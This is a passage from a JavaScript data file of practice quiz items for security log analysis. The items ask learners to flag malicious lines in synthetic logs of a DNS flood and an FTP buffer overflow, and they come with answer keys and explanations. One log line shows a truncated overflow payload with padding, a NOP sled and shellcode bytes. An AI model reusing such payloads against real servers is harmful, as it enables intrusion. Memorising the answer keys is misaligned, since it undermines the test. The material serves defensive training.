      { level: "INFO", text: "2025-10-03 09:03:00 - client 100.64.0.190: query www.twitter.com IN A -> 104.244.42.65", bad: false },
      { level: "INFO", text: "2025-10-03 09:03:49 - Resolver timeout: unable to process legitimate queries due to resource exhaustion", bad: true },
    ],
    explanation:
      "An NXDOMAIN flood (50,000 lookups for random non-existent domains), a 25,000 queries/sec flood exceeding capacity, and resolver resource exhaustion denying legitimate users = a DNS-based Distributed Denial of Service (DDoS). The objective is loss of availability via overwhelming traffic volume.",
  },
  {
    id: "log-buffer-overflow", type: "logselect", category: "logs",
    title: "Log Analysis",
    scenario: "Review the legacy FTP server log entries, identify any lines that show signs of malicious activity by selecting them, and then select the type of attack observed.",
    attackOptions: ATTACK_OPTIONS, attackAnswer: "Buffer Overflow",
    lines: [
      { level: "INFO", text: "2025-10-03 09:00:09 - Connected from 192.168.1.45", bad: false },
      { level: "INFO", text: "2025-10-03 09:00:55 - PASS ***** ", bad: false },
      { level: "INFO", text: "2025-10-03 09:01:01 - 230 Login successful", bad: false },
      { level: "INFO", text: "2025-10-03 09:01:24 - USER AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...(800+ A's)", bad: true },
      { level: "INFO", text: "2025-10-03 09:01:54 - CWD /uploads", bad: false },
      { level: "ERROR", text: "2025-10-03 09:02:27 - PASS \\x41\\x41\\x41...\\x90\\x90\\x90...(NOP sled)...\\x6b\\x89\\x76\\x08 (shellcode)", bad: true },
      { level: "INFO", text: "2025-10-03 09:03:01 - Segmentation fault (core dumped) - process vsftpd crashed", bad: true },
      { level: "INFO", text: "2025-10-03 09:03:48 - 226 Transfer complete", bad: false },
    ],
    explanation:
      "Hundreds of 'A' characters as input, a payload of \\x41 padding followed by a \\x90 NOP sled and shellcode bytes, and the process ending in a 'Segmentation fault (core dumped)' crash are the classic fingerprints of a Buffer Overflow attempting to overwrite memory and execute code.",
  },
];

if (typeof window !== "undefined") {
  window.PBQ_TEST = PBQ_TEST;
}
